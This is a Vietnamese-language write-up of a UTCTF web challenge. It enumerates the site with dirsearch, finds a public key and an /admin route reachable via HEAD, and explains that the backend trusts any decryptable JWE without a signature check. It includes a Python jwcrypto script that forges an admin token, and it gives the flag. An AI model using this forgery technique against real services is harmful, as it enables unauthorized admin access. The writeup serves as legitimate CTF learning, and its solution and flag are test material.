## 1. Giai đoạn dò tìm (Reconnaissance)

Dùng `dirsearch -u http://challenge.utctf.live:5926/` thì ra được `/resources`. 
Trong này tác giả cung cấp 1 public key để mã hóa token đăng nhập và 1 tài khoản và mật khẩu test.

```text
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsio2dcXheqKLrteRx4V1
7FchW6AE2zszlMyiN8S7D16ww1a9AFC8EQhEHNW1PLXncXiimNeb6/oZP2+V18gE
ZoyKIET2oHC4MmthSOFrW0nFgfgRJdH7VyEVHupFL6tFAJvHFWVplTgCdqtegihG
cG7XKUGah4Q8FytlIhk/A983LtbblhAnfKTeBwxT2wVZE9+5pWhPmdGLoX3Hf0Uy
pHJTkL6D7C4X4KGJiNrSJ6mJw4sDpXlZEvagB0uFaO4b22WX6HSf2ZOBW5VHEWS5
TiKvliyTQL3FJWXefqxHgQL8diDWhWwYXI7Q0b+otJ5/G/jMGL2S+N10oJTitTuK
OQIDAQAB
-----END PUBLIC KEY-----
```

<img width="692" height="730" alt="image" src="https://github.com/user-attachments/assets/d5f6fac7-7a10-4b05-8ed0-3c1c52523909" />

Có thể thấy được khi login thì sẽ có `fnsb_token` rất dài và cụ thể là 1133 char.

<img width="692" height="365" alt="image" src="https://github.com/user-attachments/assets/87ffea86-7457-49e8-977e-8aee09fb266e" />

Tiếp tục dùng `dirsearch -u http://challenge.utctf.live:5926/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -e pem,key,env,bak -t 50` 
Và ra được `/admin` nhưng khi dùng phương thức GET và POST thì nó sẽ hiện:

<img width="692" height="363" alt="image" src="https://github.com/user-attachments/assets/21742e4d-97cb-4f4c-b4df-8e2cbe9f590e" />

Nhưng khi dùng phương thức **HEAD** thì được:

<img width="691" height="353" alt="image" src="https://github.com/user-attachments/assets/7918f470-0582-4072-9246-435c687ed623" />

---

## 2. Phân tích lỗ hổng (Vulnerability Analysis)

Nhìn vào phần Header đã giải mã của token (`{"cty":"JWT","enc":"A256GCM","alg":"RSA-OAEP-256"}`), đây chính là một **JWE (JSON Web Encryption)**.

<img width="692" height="363" alt="image" src="https://github.com/user-attachments/assets/34ccdda2-155d-482b-a336-3ef5e70ff6c1" />

Cái hình này cung cấp 1 manh mối quan trọng là `sub : admin` thì mới truy cập tới `/admin` được. Từ những manh mối trên, ta sẽ chế tạo 1 `fsnb_token` giả mạo để bypass.

* **Tạo gói tin JWE hợp lệ:** Chúng ta cần tạo ra một cái token có định dạng đúng chuẩn `Header.EncryptedKey.IV.Ciphertext.Tag` mà Server có thể chấp nhận. Vì chúng ta có Public Key của Server, nên chúng ta chắc chắn tạo được gói tin này.
* **Bỏ qua bước xác thực (Signature):** Mục đích thực sự là khai thác lỗ hổng logic trên Backend. Backend của bài CTF này đã mắc sai lầm chí mạng: Họ tin rằng chỉ cần họ dùng Private Key để giải mã (Decrypt) thành công gói JWE, thì nội dung bên trong đó là an toàn và đáng tin cậy. Họ đã quên mất bước kiểm tra xem dữ liệu đó có được ký bởi một chữ ký hợp lệ hay không.
* **Chiếm quyền Admin:** Bằng cách nhét `{"sub": "admin"}` vào bên trong và mã hóa nó thành một cấu trúc JWE hoàn chỉnh, chúng ta đang lừa cho Server tự giải mã, và khi thấy chữ "admin", nó sẽ cấp quyền Admin cho chúng ta mà không hề nghi ngờ.

---

## 3. Khai thác (Exploitation)

Dưới đây là Script Python sử dụng thư viện `jwcrypto` để chế tạo payload:

```python
import base64
import json
import time
from jwcrypto import jwk, jwe

def b64url(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

pub_key_pem = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsio2dcXheqKLrteRx4V1
7FchW6AE2zszlMyiN8S7D16ww1a9AFC8EQhEHNW1PLXncXiimNeb6/oZP2+V18gE
ZoyKIET2oHC4MmthSOFrW0nFgfgRJdH7VyEVHupFL6tFAJvHFWVplTgCdqtegihG
cG7XKUGah4Q8FytlIhk/A983LtbblhAnfKTeBwxT2wVZE9+5pWhPmdGLoX3Hf0Uy
pHJTkL6D7C4X4KGJiNrSJ6mJw4sDpXlZEvagB0uFaO4b22WX6HSf2ZOBW5VHEWS5
TiKvliyTQL3FJWXefqxHgQL8diDWhWwYXI7Q0b+otJ5/G/jMGL2S+N10oJTitTuK
OQIDAQAB
-----END PUBLIC KEY-----"""

server_pub_key = jwk.JWK.from_pem(pub_key_pem)

payload = {
    "sub": "admin",
    "iat": int(time.time())
}

b64_payload = b64url(json.dumps(payload))
t1_inner = json.dumps(payload)

inners = [
    ("JSON", t1_inner, None)
]

for name, inner, cty in inners:
    jwe_header = {
        "alg": "RSA-OAEP-256",
        "enc": "A256GCM"
    }
    if cty:
        jwe_header["cty"] = cty
    jwetoken = jwe.JWE(inner.encode('utf-8'), json.dumps(jwe_header))
    jwetoken.add_recipient(server_pub_key)
    print(jwetoken.serialize(compact=True))
```

---

## 4. Kết quả (Results)

Sau khi chạy script và có được `fsnb_token`, tiến hành thay cookie trên trình duyệt và nhận flag.

<img width="691" height="353" alt="image" src="https://github.com/user-attachments/assets/f8df5f48-fcbf-46db-a33b-e272a628dd45" />

**🚩 Flag:** `utflag{s0m3_c00kies_@re_t@sti3r_th@n_0th3rs}`

